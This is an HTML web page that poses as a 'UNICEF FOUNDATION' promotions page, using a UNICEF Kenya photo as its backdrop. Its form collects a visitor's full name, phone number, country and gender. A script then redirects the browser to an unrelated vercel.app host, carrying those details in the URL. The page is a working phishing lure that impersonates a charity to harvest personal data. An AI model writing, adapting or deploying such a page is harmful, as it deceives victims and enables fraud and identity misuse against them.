<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validate Your Details</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
            background-image: url('https://www.unicef.org/kenya/sites/unicef.org.kenya/files/styles/press_release_feature/public/WhatsApp%20Image%202020-11-19%20at%2010.26.26.jpeg.webp?itok=VbBZUeYS');
            background-size: cover;
            background-position: center;
            font-family: Arial, sans-serif;
        }

        .container {
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.8);
            border-radius: 10px;
            margin: auto;
            width: 80%;
            max-width: 600px;
        }

        .unicef-title {
            color: green;
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }

        h2 {
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
        }

        input[type="text"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: block;
            margin: 0 auto;
        }

        button:hover {
            background-color: #0056b3;
        }

        small {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="unicef-title">UNICEF FOUNDATION</h1>
        <h2>Welcome to our Promotions! Please validate your details below.</h2>
        <form id="userForm">
            <div class="form-group">
                <label for="fullName">Full Name:</label>
                <input type="text" id="fullName" name="fullName" required>
            </div>
            <div class="form-group">
                <label for="phoneNumber">Phone Number:</label>
                <input type="tel" id="phoneNumber" name="phoneNumber" pattern="[0-9]{10}" required>
                <small>Format: 10 digits only</small>
            </div>
            <div class="form-group">
                <label for="country">Country:</label>
                <input type="text" id="country" name="country" required>
            </div>
            <div class="form-group">
                <label for="gender">Gender:</label>
                <select id="gender" name="gender" required>
                    <option value="">Select</option>
                    <option value="male">Male</option>
                    <option value="female">Female</option>
                    <option value="other">Other</option>
                </select>
            </div>
            <button type="button" onclick="submitForm()">Continue</button>
        </form>
        <!-- Space for another heading -->
        <h2>Thank you for your participation!</h2>
    </div>

    <script>
        function submitForm() {
            var fullName = document.getElementById("fullName").value;
            var phoneNumber = document.getElementById("phoneNumber").value;
            var country = document.getElementById("country").value;
            var gender = document.getElementById("gender").value;

            // Redirect to details page with user's details as query parameters
            window.location.href = "https://sums-ten.vercel.app/" + encodeURIComponent(fullName) + "&phoneNumber=" + encodeURIComponent(phoneNumber) + "&country=" + encodeURIComponent(country) + "&gender=" + encodeURIComponent(gender);
        }
    </script>
</body>
</html>
